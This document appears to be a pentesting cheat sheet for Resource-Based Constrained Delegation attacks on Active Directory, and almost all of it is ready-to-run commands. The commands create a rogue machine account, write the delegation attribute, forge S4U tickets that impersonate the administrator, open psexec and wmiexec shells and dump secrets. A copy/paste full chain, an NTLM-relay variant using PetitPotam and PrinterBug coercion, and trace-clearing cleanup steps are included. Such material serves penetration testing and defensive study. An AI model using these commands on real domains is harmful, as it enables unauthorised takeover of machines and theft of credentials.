# RBCD — Resource-Based Constrained Delegation

**What is it:** RBCD flips the delegation model. Instead of service A saying "I'm allowed to delegate to service B", resource B says "I trust service A to delegate to me." This is controlled via the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on the target computer object.

**Why it's powerful:** If you have **GenericWrite** or **GenericAll** over a computer object, you can add ANY machine account you control as a trusted delegator — then impersonate any user to that machine.

---

## Prerequisites

- You have **GenericWrite, GenericAll, or WriteProperty** over a target computer object in AD
- You can create a machine account (requires `MachineAccountQuota > 0` — default is 10 per user in AD)
- OR you already control a service account / computer account with an SPN

---

## Step 1: Verify Target Permissions

```powershell
# Check who has write access on the target computer:
Get-DomainObjectAcl -Identity TARGET_COMPUTER -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty"}

# Via BloodHound: Look for GenericWrite → Computer edges
# Shortest Path to Domain Admin query will highlight these

# Check MachineAccountQuota (how many machines you can add):
Get-DomainObject -Identity "DC=corp,DC=com" -Properties ms-DS-MachineAccountQuota
# Default: 10 — any domain user can add 10 computer accounts
```

---

## Step 2: Create a Fake Machine Account

If you don't already control a computer/service account with an SPN:

```powershell
# Using PowerMad (PowerShell — on Windows):
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FakePC -Password $(ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)

# Verify creation:
Get-DomainComputer -Identity FakePC

# Get the SID of the new machine account (needed for the next step):
Get-DomainComputer -Identity FakePC | Select-Object objectsid
# Example output: S-1-5-21-...-XXXX

# Via impacket (from Kali) — addcomputer:
impacket-addcomputer -computer-name 'FakePC$' -computer-pass 'P@ssw0rd123!' -dc-ip 192.168.1.1 corp.com/user:password
```

---

## Step 3: Set msDS-AllowedToActOnBehalfOfOtherIdentity

Set FakePC as a trusted delegator for the target machine:

```powershell
# Using PowerView (Windows):
$FakePCSID = Get-DomainComputer -Identity FakePC | Select-Object -ExpandProperty objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($FakePCSID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity TARGET_COMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify:
Get-DomainComputer -Identity TARGET_COMPUTER -Properties msds-allowedtoactonbehalfofotheridentity

# Using impacket (from Kali) — rbcd:
impacket-rbcd -action write -delegate-to 'TARGET_COMPUTER$' -delegate-from 'FakePC$' -dc-ip 192.168.1.1 corp.com/user:password

# Verify via impacket:
impacket-rbcd -action read -delegate-to 'TARGET_COMPUTER$' -dc-ip 192.168.1.1 corp.com/user:password
```

---

## Step 4: Get FakePC's TGT

```bash
# From Kali — get TGT for FakePC (using the password set in Step 2):
impacket-getTGT corp.com/'FakePC$' -hashes :$(python3 -c "import hashlib; print(hashlib.new('md4','P@ssw0rd123!'.encode('utf-16le')).hexdigest())") -dc-ip 192.168.1.1
# OR with password directly:
impacket-getTGT corp.com/'FakePC$':'P@ssw0rd123!' -dc-ip 192.168.1.1

export KRB5CCNAME=FakePC\$.ccache
```

On Windows (using Rubeus):
```powershell
# Get NTLM hash of the fake machine password first:
.\Rubeus.exe hash /password:'P@ssw0rd123!'
# Note the RC4_HMAC hash from output

# Get TGT:
.\Rubeus.exe asktgt /user:FakePC$ /ntlm:<RC4_HASH> /domain:corp.com /nowrap
# Or:
.\Rubeus.exe asktgt /user:FakePC$ /password:P@ssw0rd123! /domain:corp.com /nowrap
```

---

## Step 5: S4U Attack — Impersonate Administrator

```bash
# From Kali — S4U2Self + S4U2Proxy (FakePC impersonates Administrator to TARGET):
impacket-getST -spn 'cifs/TARGET_COMPUTER.corp.com' -impersonate administrator corp.com/'FakePC$':'P@ssw0rd123!' -dc-ip 192.168.1.1

# Export the resulting ticket:
export KRB5CCNAME='administrator@cifs_TARGET_COMPUTER.corp.com@CORP.COM.ccache'

# Get a shell:
impacket-psexec -k -no-pass corp.com/administrator@TARGET_COMPUTER.corp.com
impacket-wmiexec -k -no-pass corp.com/administrator@TARGET_COMPUTER.corp.com
impacket-secretsdump -k -no-pass corp.com/administrator@TARGET_COMPUTER.corp.com
```

Windows (Rubeus):
```powershell
# S4U attack from Windows — inject the ticket:
.\Rubeus.exe s4u /user:FakePC$ /ntlm:<RC4_HASH> /impersonateuser:administrator /msdsspn:cifs/target.corp.com /domain:corp.com /ptt

# Verify and use:
klist
dir \\target.corp.com\c$
```

---

## Full Attack Chain (Copy/Paste)

```bash
# KALI ATTACK CHAIN:

# 1. Verify GenericWrite (from Windows or via BloodHound)

# 2. Create fake machine account:
impacket-addcomputer -computer-name 'FakePC$' -computer-pass 'P@ssw0rd123!' \
    -dc-ip <DC_IP> corp.com/<user>:<password>

# 3. Set RBCD attribute:
impacket-rbcd -action write -delegate-to 'TARGET$' -delegate-from 'FakePC$' \
    -dc-ip <DC_IP> corp.com/<user>:<password>

# 4. Get TGT for FakePC:
impacket-getTGT corp.com/'FakePC$':'P@ssw0rd123!' -dc-ip <DC_IP>
export KRB5CCNAME=FakePC\$.ccache

# 5. S4U attack:
impacket-getST -spn 'cifs/target.corp.com' -impersonate administrator \
    corp.com/'FakePC$':'P@ssw0rd123!' -dc-ip <DC_IP>

# 6. Use the ticket:
export KRB5CCNAME='administrator@cifs_target.corp.com@CORP.COM.ccache'
impacket-psexec -k -no-pass corp.com/administrator@target.corp.com
```

---

## Cleanup (Post-Exploitation)

```powershell
# Remove msDS-AllowedToActOnBehalfOfOtherIdentity from target:
Set-DomainObject -Identity TARGET_COMPUTER -Clear msds-allowedtoactonbehalfofotheridentity

# Remove the fake machine account:
Get-DomainComputer -Identity FakePC | Remove-DomainObject

# Via impacket:
impacket-rbcd -action flush -delegate-to 'TARGET$' -dc-ip <DC_IP> corp.com/user:pass
```

---

## RBCD via NTLMRelay (When You Can Coerce Auth)

If you can coerce NTLM auth from a target machine (using PetitPotam, PrinterBug, etc.):

```bash
# Terminal 1: Set up ntlmrelayx to write RBCD attribute:
impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access --escalate-user FakePC$ --no-smb-server --http-port 8080

# Terminal 2: Coerce auth from target to your listener:
# PetitPotam:
python3 PetitPotam.py -u user -p password -d corp.com <KALI_IP> TARGET.corp.com
# PrinterBug / SpoolSample:
python3 printerbug.py corp.com/user:password@TARGET.corp.com <KALI_IP>

# After relay succeeds → ntlmrelayx writes the RBCD attribute
# Then continue from Step 4 above
```

---

## Troubleshooting

| Error | Solution |
|-------|---------|
| "Clock skew too great" | `sudo ntpdate <DC_IP>` |
| "getST stalls" | Add `-dc-ip <DC_IP>` explicitly |
| "Target not delegatable" | Verify RBCD attribute was written correctly |
| "MachineAccountQuota: 0" | Can't add new machines — must use an existing service account with an SPN |
| Ticket filename varies | Check exact filename from getST output — format: `user@spn@REALM.ccache` |
